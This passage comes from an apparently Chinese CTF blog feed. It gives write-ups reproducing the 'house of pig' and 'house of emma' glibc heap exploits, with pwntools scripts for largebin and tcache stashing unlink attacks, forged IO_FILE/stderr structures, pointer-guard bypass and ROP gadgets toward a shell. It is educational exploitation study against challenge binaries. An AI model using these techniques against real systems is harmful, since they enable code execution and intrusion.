2-&gt;7</span></span><br><span class="line"><span class="comment">#fix largebin</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache smashing unlink</span></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span></span><br><span class="line"><span class="comment">#gift!</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)</span><br><span class="line"><span class="comment">#fake IOFILE</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size)</span><br><span class="line"></span><br><span class="line">old_buf = fp-&gt;_IO_buf_base</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</span><br></pre></td></tr></table></figure><p>此时<code>_IO_list_all</code>指针已经指向了gift chunk,这个chunk的内容完全是可控的</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p><p>注意前面tcache stashing unlink改的位置，可能需要在__free_hook的地址处加减0x8，因为tcache申请会检查十六字节对齐</p><p>因为我没用原题的glibc,这里我对齐之后，0xe8大小的堆块不够写了，按照出题人的思路应该是刚好够写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = heap_base+<span class="number">0x13da0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2166c0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</span><br></pre></td></tr></table></figure><h3 id="改memset-got做法"><a href="#改memset-got做法" class="headerlink" title="改memset got做法"></a>改memset got做法</h3><p>由于libc是partial RELRO，got表可写</p><p>因此可以把memset的got当作一个__free_hook</p><p>注意这里做tcache stashing unlink时不能直接覆盖memset的got表，这是因为calloc中会调用memset,如果这时的got已经进入tcache,则会变成加密后的fd，rip运行到这里时会报错</p><p>因而正确的做法应该是预留一定的空间，本题限制较大，故不做演示，仅提出思路</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of emma 21湖湘杯复现</title>
      <link href="/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>讲水课，恰大米</p></blockquote><p>沙箱开启，考虑orw</p><p>保护全开</p><h2 id="VM分析"><a href="#VM分析" class="headerlink" title="VM分析"></a>VM分析</h2><p>循环输入，每次读最多0x500，每次循环分配释放0x2000空间</p><p>注意这里每次循环时的malloc,会影响后面的堆风水</p><h3 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h3><p><code>sub_1288</code>处无法识别</p><p>undefine后，由gdb动调知入口在0x1289处，修复为函数</p><p>将输入的字符串指针存在<code>[rbp-18h]</code>处</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720151519060.png" alt="image-20230720151519060"></p><p>随后取第一个byte，与运算0Fh，进行一个没什么用的检查，再将该值*4放入<code>rdx</code>，与一个首地址相加放入<code>eax</code>，符号拓展为<code>rax</code>（因为是负数），再与该首地址相加（<code>rax</code>为补码，实际为相减），其中算负数计算式为<code>hex((~0xfffffffffffff3a1&amp;0xffffffffffffffff)+0x1)</code>，随后跳转到该位置</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720152303704.png" alt="image-20230720152303704"></p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>1488h</td><td>13ddh</td><td>1404h</td><td>1428h</td><td>144ch</td><td>1481h</td><td>12dah</td><td>130dh</td><td>13abh</td><td>1342h</td></tr><tr><td>fail</td><td>add</td><td>delet</td><td>show</td><td>edit</td><td>leave&amp;ret</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230721133000180.png" alt="image-20230721133000180"></p><p>连按d修复跳转表，观察补码可知为4字节一组</p><p>其实可以用ida的edit-&gt;other-&gt;specify switch idiom功能修复为switch</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174743516-1689673665848-1.png" alt="image-20230718174743516"></li><li>+4&amp;jump to start</li></ul><h3 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h3><ul><li><p>index 2nd byte</p></li><li><p>uaf</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174950029.png" alt="image-20230718174950029"></p></li><li><p>+2</p></li></ul><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul><li><p>index 2nd byte</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718175134076.png" alt="image-20230718175134076"></p></li><li><p>+2</p></li></ul><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li>content 2nd dword, size</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230719093944933.png" alt="image-20230719093944933"></li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>存在UAF，可多次进行largbin attack</p><p>无法改写为任意地址，无法直接house of kiwi，考虑house of emma</p><ul><li><p>泄露libc、heap基址</p></li><li><p>两次largbin attack改写<code>stderr</code>和<code>__pointer_chk_guard</code></p></li><li><p>合理伪造stderr与IO链</p></li><li><p>触发<code>__malloc_assert</code></p></li></ul><h2 id="堆布局与largbin-attack"><a href="#堆布局与largbin-attack" class="headerlink" title="堆布局与largbin attack"></a>堆布局与largbin attack</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#获取libc基址</span></span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + <span class="number">0x3c0740</span> + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure><p>free掉任意一个unsorted bin可获取libc基址</p><blockquote><p>问题：这里的chunk 0为什么能保持在unsorted bin中，而没有在循环开始malloc0x2000时放入large bin？</p><p>因为chunk 0和0x2000紧邻，每次完成循环都会触发合并，并在分配时被切下来</p></blockquote><p>构造0&lt;2，free掉后申请一块较小的chunk，将2放入largebin以获取heap基址</p><p>注意输出存在截断，可以先把2的fd,bk部分填满，事后记得要修复</p><p>注意largbin大小0x440~0x480为一个范围，为后续largebin attack起见，应注意预留大小</p><h3 id="largebin-attack-2"><a href="#largebin-attack-2" class="headerlink" title="largebin attack*2"></a>largebin attack*2</h3><p>largebin attack的利用方式：</p><ol><li>将一个较大的、largebin中的chunk的bk_nextsize覆盖为[target-0x20]</li><li>将一个较小的chunk放入<strong>同一个</strong>largebin，触发unlink</li><li>此时[target]的内容被修改为较小chunk的地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)<span class="comment">#构造的同时顺便修复</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>将5free掉，放入largebin，打出一次attack，修改stderr</p><p>又通过7将5申请回来，（这里申请之前没有修复，导致stderr指向了2）</p><p>随后再更改2，再free掉7（5），打出第二次attack，修改point_guard</p><h3 id="pointer-chk-guard"><a href="#pointer-chk-guard" class="headerlink" title="__pointer_chk_guard"></a>__pointer_chk_guard</h3><p>该值存在于fs:0x30</p><p>tls基址查看方式为<code>fsbase</code>或<code>tls</code>（pwngdb)，加上0x30即为guard值</p><p>也可以直接用gdb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call arch_prctl(0x1003, $rsp - 0x8)    </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0</span> </span><br><span class="line">(gdb) x /gx $rsp - 0x8</span><br><span class="line">0x7fffffffe6e8: 0x00007ffff7fe0700   =&gt; IA32_FS_BASE</span><br></pre></td></tr></table></figure><p>本地gdb调试时该值与libc偏移可能改变，调试时可以先关闭aslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><h3 id="修复largebin与准备触发-malloc-assert"><a href="#修复largebin与准备触发-malloc-assert" class="headerlink" title="修复largebin与准备触发__malloc_assert"></a>修复largebin与准备触发__malloc_assert</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>先分别修补两个largebin，防止分配时发生错误</p><p>申请8填补5,申请9填补2</p><p>将最外层的chunk 6 free掉，加入unsorted bin并与top chunk合并</p><p>再申请一块略小于6的chunk 10，通过修改chunk 6的内容修改top chunk的size段</p><p>此处改为0x10使之页不对齐</p><p>后面只需要申请一个chunk就可以触发<code>__malloc_assert</code></p><h2 id="构造IO利用链"><a href="#构造IO利用链" class="headerlink" title="构造IO利用链"></a>构造IO利用链</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>假设我们控制了<code>stderr</code>，进入了<code>_IO_cookie_write</code>，调用函数指针<code>write_cb</code>，此时我们只能控制进入函数时的<code>rdi</code>，而控制<code>setcontext</code>需要控制rdx</p><p>碰巧有一个gadget，能够利用<code>rdi</code>控制<code>rdx</code>，还能call一个和<code>rdx</code>相关的地址</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720211806875.png" alt="image-20230720211806875"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br></pre></td></tr></table></figure><h3 id="fake-stderr"><a href="#fake-stderr" class="headerlink" title="fake stderr"></a>fake stderr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>进入<code>__malloc_assert</code>后，利用<code>__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn ( =&gt; _IO_cookie_write)</code>调用链</p><p>需要满足<code>_IO_write_ptr &gt; _IO_write_base</code>，且<code>_lock</code>指向可写地址，此处直接使用原地址<code>_IO_stdfile_2_lock</code></p><p><code>vtable</code>需要伪造，触发IO时，原本指向<code>_IO_file_jumps -&gt; __xsputn</code>，即<code>&lt;__GI__IO_file_jumps+56&gt;</code>，需要伪造为<code>_IO_cookie_jumps-&gt; __write</code>，即<code>&lt;_IO_cookie_jumps+120&gt;</code>，故此处填上<code>_IO_cookie_jumps+0x40</code></p><p>构造<code>__cookie</code>为chunk 0的地址，注意为了方便更改，地址加上0x10，之后chunk 0的用户地址会进入<code>rdi</code></p><p>构造<code>cookie_write_function_t *write</code>处指针为gadget地址，调用时直接运行gadget，此处有加密</p><h3 id="rdi-rdx"><a href="#rdi-rdx" class="headerlink" title="rdi -&gt; rdx"></a>rdi -&gt; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>修改chunk 0，使rdx指向chunk5</p><h3 id="布置rdx附近满足setcontext"><a href="#布置rdx附近满足setcontext" class="headerlink" title="布置rdx附近满足setcontext"></a>布置rdx附近满足setcontext</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 